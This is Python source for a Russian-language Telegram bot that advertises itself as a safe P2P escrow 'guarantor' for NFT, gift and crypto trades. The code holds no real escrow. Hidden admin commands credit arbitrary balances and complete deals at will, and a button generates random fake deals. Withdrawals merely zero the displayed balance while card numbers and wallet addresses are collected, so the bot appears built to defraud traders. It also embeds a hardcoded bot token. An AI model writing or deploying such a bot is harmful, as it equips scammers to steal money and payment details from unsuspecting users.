import asyncio
import logging
import os
import sys
import signal
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8862273506:AAHvSY7aLzmiTr_qnSLm10JzJWKey8TSfzU")
MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/W4xFfP0j/banner.png")

users = {}
deals = {}
deal_counter = 1000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

WELCOME_TEXT = (
    "💼 Добро пожаловать в  🤝\n\n"
    "⚡️ Ваш надёжный P2P-гарант:\n"
    "1⃣ Автоматические сделки с NFT и подарками\n"
    "2⃣ 🛡 Полная защита обеих сторон\n"
    "3⃣ 🪙 Реферальная программа — 50% от комиссии\n"
    "4⃣ 📦 Передача товаров через менеджера\n\n"
    "💡 Выберите действие ниже ⬇️"
)

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()

def main_menu(lang="ru"):
    t = {
        "ru": {"balance": "💰 Баланс", "my_deals": "📋 Мои сделки", "new_deal": "🤝 Создать сделку",
               "my_rekv": "📄 Мои реквизиты", "referrals": "👥 Рефералы", "lang": "🌐 Язык / Language", "support": "🆘 Техподдержка"},
        "en": {"balance": "💰 Balance", "my_deals": "📋 My Deals", "new_deal": "🤝 New Deal",
               "my_rekv": "📄 My Details", "referrals": "👥 Referrals", "lang": "🌐 Language / Язык", "support": "🆘 Support"}
    }[lang]
    kb = [
        [InlineKeyboardButton(text=t["balance"], callback_data="balance_menu")],
        [InlineKeyboardButton(text=t["my_deals"], callback_data="my_deals"), InlineKeyboardButton(text=t["new_deal"], callback_data="new_deal")],
        [InlineKeyboardButton(text=t["my_rekv"], callback_data="my_rekv")],
        [InlineKeyboardButton(text=t["referrals"], callback_data="referrals")],
        [InlineKeyboardButton(text=t["lang"], callback_data="change_lang"), InlineKeyboardButton(text=t["support"], callback_data="support")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu():
    kb = [
        [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Создать тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru"):
    t = {"ru": {"history": "📜 История транзакций", "withdraw": "💸 Вывод средств", "back": "🔙 Назад"},
         "en": {"history": "📜 Transaction History", "withdraw": "💸 Withdraw", "back": "🔙 Back"}}[lang]
    kb = [[InlineKeyboardButton(text=t["history"], callback_data="tx_history")],
          [InlineKeyboardButton(text=t["withdraw"], callback_data="withdraw_funds")],
          [InlineKeyboardButton(text=t["back"], callback_data="main_menu")]]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru"):
    t = {"ru": ["💎 TON Кошелек", "💳 Карта", "👤 Юзернейм", "⭐ Звезды", "💵 USDT Кошелек", "₿ BTC Кошелек", "🔙 Назад"],
         "en": ["💎 TON Wallet", "💳 Card", "👤 Username", "⭐ Stars", "💵 USDT Wallet", "₿ BTC Wallet", "🔙 Back"]}[lang]
    kb = [[InlineKeyboardButton(text=t[i], callback_data=f"set_{['ton','card','username','stars','usdt','btc'][i]}")] for i in range(6)]
    kb.append([InlineKeyboardButton(text=t[6], callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru"):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller")],
        [InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru"):
    cur = [("💎 TON", "ton"), ("💳 Карта", "card"), ("👤 Юзернейм", "username"),
           ("⭐ Звезды", "stars"), ("💵 USDT", "usdt"), ("₿ BTC", "btc")]
    kb = []
    for i in range(0, 6, 2):
        row = [InlineKeyboardButton(text=cur[i][0], callback_data=f"cur_{cur[i][1]}")]
        if i+1 < 6: row.append(InlineKeyboardButton(text=cur[i+1][0], callback_data=f"cur_{cur[i+1][1]}"))
        kb.append(row)
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]])

def get_lang(uid): return users.get(uid, {}).get("lang", "ru")

async def send_welcome(chat_id, lang="ru"):
    if BANNER_URL:
        try:
            await bot.send_photo(chat_id, URLInputFile(BANNER_URL), caption=WELCOME_TEXT, reply_markup=main_menu(lang))
            return
        except: pass
    await bot.send_message(chat_id, WELCOME_TEXT, reply_markup=main_menu(lang))

async def edit_to_welcome(call, lang="ru"):
    if BANNER_URL:
        try:
            await call.message.edit_media(types.InputMediaPhoto(media=URLInputFile(BANNER_URL), caption=WELCOME_TEXT), reply_markup=main_menu(lang))
            return
        except: pass
    try: await call.message.edit_text(WELCOME_TEXT, reply_markup=main_menu(lang))
    except: await send_welcome(call.from_user.id, lang)

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    sid, amt = d["seller_id"], d["amount"]
    if sid in users:
        users[sid]["balance"] += amt
        users[sid].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt}₽")
    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt}₽."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu())
    try:
        await bot.send_message(sid, f"✅ Сделка #{deal_id} завершена! +{amt}₽.")
        if d["buyer_id"]: await bot.send_message(d["buyer_id"], f"✅ Сделка #{deal_id} завершена.")
    except: pass

# /start
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = message.from_user.id
    args = message.text.split()
    ref_id = None
    if len(args) > 1 and args[1].startswith("deal_"):
        try:
            deal_id = int(args[1].split("_")[1])
            if deal_id in deals and deals[deal_id]["status"] == "active":
                d = deals[deal_id]
                if d["seller_id"] is None: d["seller_id"] = uid
                elif d["buyer_id"] is None: d["buyer_id"] = uid
                else: return await message.answer("❌ Сделка уже заполнена.")
                return await message.answer(f"✅ Вы в сделке #{deal_id}!\nСумма: {d['amount']} {d['currency']}", reply_markup=main_menu(get_lang(uid)))
        except: pass
    if len(args) > 1:
        try: ref_id = int(args[1])
        except: pass
    if uid not in users:
        users[uid] = {"balance":0,"ton":"","card":"","username":"","stars":"","usdt":"","btc":"","lang":"ru","history":[],"pending_rekv":None,"referrer_id":ref_id,"referrals":[]}
        if ref_id and ref_id != uid and ref_id in users:
            users[ref_id]["balance"] += 2.0
            users[ref_id].setdefault("history",[]).append(f"🎁 Реферал: +2₽ от {uid}")
            users[ref_id].setdefault("referrals",[]).append(uid)
            try: await bot.send_message(ref_id, "🎁 +2₽ за друга!")
            except: pass
    await send_welcome(message.chat.id, get_lang(uid))

# /admin
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu())

# /masterb
@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Зачисление: +{amt}₽")
        await message.answer(f"✅ {uid} получил {amt}₽.")
        try: await bot.send_message(uid, f"💰 +{amt}₽ на баланс!")
        except: pass
    except: await message.answer("❌ /masterb user_id сумма")

# /giveMas
@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active": return await message.answer("❌ Сделка не найдена.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ /giveMas deal_id")

# Главное меню
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call): await edit_to_welcome(call, get_lang(call.from_user.id))

# Админ callback
@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await call.message.edit_text("Введи: user_id сумма", reply_markup=back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Админ: +{amt}₽")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt}₽.", reply_markup=admin_menu())
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await call.message.edit_text("Введи ID сделки:", reply_markup=back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active": return await message.answer("❌ Не найдена.", reply_markup=admin_menu())
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введи число.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    if not deals: return await call.message.edit_text("📭 Пусто.", reply_markup=admin_menu())
    txt = "📋 Сделки:\n\n" + "\n".join([f"#{did}: {d['amount']} {d['currency']} | Продавец:{d['seller_id']} | {d['status']}" for did,d in deals.items()])
    await call.message.edit_text(txt, reply_markup=admin_menu())

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    txt = f"📊 Статистика:\n\n👥 Юзеров: {len(users)}\n📋 Сделок: {len(deals)}\n🟢 Активных: {sum(1 for d in deals.values() if d['status']=='active')}\n💰 Общий баланс: {sum(u.get('balance',0) for u in users.values())}₽"
    await call.message.edit_text(txt, reply_markup=admin_menu())

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        deals[deal_counter] = {"seller_id": MASTER_ID, "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
                               "amount": round(random.uniform(100,10000),2), "currency": random.choice(cur_list),
                               "status": random.choice(["active","completed"])}
    await call.message.edit_text(f"✅ Создано {cnt} тестовых сделок.", reply_markup=admin_menu())

# Баланс
@dp.callback_query(F.data == "balance_menu")
async def bal(call):
    uid=call.from_user.id; lang=get_lang(uid)
    await call.message.edit_text(f"💰 Баланс: {users.get(uid,{}).get('balance',0):.2f}₽", reply_markup=balance_menu(lang))

@dp.callback_query(F.data == "tx_history")
async def hist(call):
    uid=call.from_user.id; lang=get_lang(uid); h=users.get(uid,{}).get("history",[])
    await call.message.edit_text("📜 " + ("\n".join(h[-15:]) if h else "Пусто"), reply_markup=back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def wd(call):
    uid=call.from_user.id; lang=get_lang(uid); b=users.get(uid,{}).get("balance",0)
    if b<=0: return await call.answer("❌ Мало средств", show_alert=True)
    users[uid]["balance"]=0; users[uid].setdefault("history",[]).append(f"💸 Вывод: -{b:.2f}₽")
    await call.message.edit_text(f"✅ Выведено {b:.2f}₽", reply_markup=back_button(lang))

# Реквизиты
@dp.callback_query(F.data == "my_rekv")
async def rekv(call):
    uid=call.from_user.id; lang=get_lang(uid); u=users.get(uid,{})
    lbl={"ton":"💎 TON","card":"💳 Карта","username":"👤 Юзернейм","stars":"⭐ Звезды","usdt":"💵 USDT","btc":"₿ BTC"}
    txt="\n".join([f"{v}: {u.get(k,'❌')}" for k,v in lbl.items()])
    await call.message.edit_text(txt, reply_markup=rekv_menu(lang))

for cb,k in [("set_ton","ton"),("set_card","card"),("set_username","username"),("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask(call, k=k):
        uid=call.from_user.id; lang=get_lang(uid)
        pr={"ton":("TON кошелёк:","TON wallet:"),"card":("Номер карты:","Card:"),"username":("Юзернейм:","Username:"),
            "stars":("ID звёзд:","Stars ID:"),"usdt":("USDT:","USDT:"),"btc":("BTC:","BTC:")}
        users[uid]["pending_rekv"]=k
        await call.message.edit_text(pr[k][0] if lang=="ru" else pr[k][1], reply_markup=back_button(lang))

@dp.message()
async def rekv_input(msg: Message):
    uid=msg.from_user.id
    if uid in users and users[uid].get("pending_rekv"):
        users[uid][users[uid]["pending_rekv"]]=msg.text
        users[uid]["pending_rekv"]=None
        await msg.answer("✅ Сохранено!", reply_markup=main_menu(get_lang(uid)))

# Сделки
@dp.callback_query(F.data == "new_deal")
async def new_deal(call, state: FSMContext):
    await state.clear()
    await call.message.edit_text("Роль:", reply_markup=deal_role_choice(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_pick(call, state: FSMContext):
    await state.update_data(role="seller" if call.data=="role_seller" else "buyer")
    await call.message.edit_text("Валюта получения:", reply_markup=currency_choice(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def cur_pick(call, state: FSMContext):
    await state.update_data(currency=call.data.replace("cur_",""))
    await call.message.edit_text("Сумма:", reply_markup=back_button(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def amt_enter(msg: Message, state: FSMContext):
    global deal_counter
    uid=msg.from_user.id; lang=get_lang(uid)
    try:
        amt=float(msg.text)
        if amt<=0: raise ValueError
    except: return await msg.answer("❌ Введи число.")
    data=await state.get_data(); deal_counter+=1; role=data["role"]
    deals[deal_counter]={"seller_id":uid if role=="seller" else None,"buyer_id":uid if role=="buyer" else None,
                         "amount":amt,"currency":data["currency"],"status":"active"}
    link=f"https://t.me/{(await bot.me()).username}?start=deal_{deal_counter}"
    await msg.answer(f"✅ Сделка #{deal_counter} создана!\n\n🔗 Ссылка для второй стороны:\n{link}", reply_markup=main_menu(lang))
    await state.clear()

@dp.callback_query(F.data == "my_deals")
async def my_deals_cb(call):
    uid=call.from_user.id; lang=get_lang(uid)
    ud=[(did,d) for did,d in deals.items() if d["seller_id"]==uid or d["buyer_id"]==uid]
    if not ud: return await call.message.edit_text("🔍 Нет сделок.", reply_markup=back_button(lang))
    txt="📋 Сделки:\n\n"+"\n".join([f"🔹 #{did}: {d['amount']} {d['currency']} | {d['status']}" for did,d in ud])
    await call.message.edit_text(txt+"\n\n🔎 /search код", reply_markup=back_button(lang))

@dp.message(Command("search"))
async def search_cmd(msg: Message):
    try:
        _,did_s=msg.text.split(); did=int(did_s)
        d=deals.get(did)
        if d: await msg.answer(f"🔍 #{did}: {d['amount']} {d['currency']} | {d['status']}")
        else: await msg.answer("❌ Не найдена.")
    except: await msg.answer("❌ /search код")

# Рефералы
@dp.callback_query(F.data == "referrals")
async def ref_cb(call):
    uid=call.from_user.id; lang=get_lang(uid)
    refs=users.get(uid,{}).get("referrals",[])
    link=f"https://t.me/{(await bot.me()).username}?start={uid}"
    txt=f"👥 Рефералы\n\n🔗 Ссылка:\n{link}\n\n👤 Друзей: {len(refs)}\n💰 Заработано: {len(refs)*2}₽"
    await call.message.edit_text(txt, reply_markup=back_button(lang))

# Язык
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call):
    uid=call.from_user.id; cur=users.setdefault(uid,{}).setdefault("lang","ru")
    nl="en" if cur=="ru" else "ru"; users[uid]["lang"]=nl
    await call.message.edit_text("🌐 Язык изменён!", reply_markup=main_menu(nl))

# Поддержка
@dp.callback_query(F.data == "support")
async def supp_cb(call):
    lang=get_lang(call.from_user.id)
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать @dumufa", url="https://t.me/dumufa")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])
    await call.message.edit_text("🆘 Поддержка: @dumufa", reply_markup=kb)

# Запуск
async def main():
    logging.info("Старт...")
    try: await bot.session.close()
    except: pass
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), polling_timeout=20, handle_as_tasks=True)

if __name__=="__main__":
    signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))
    asyncio.run(main())
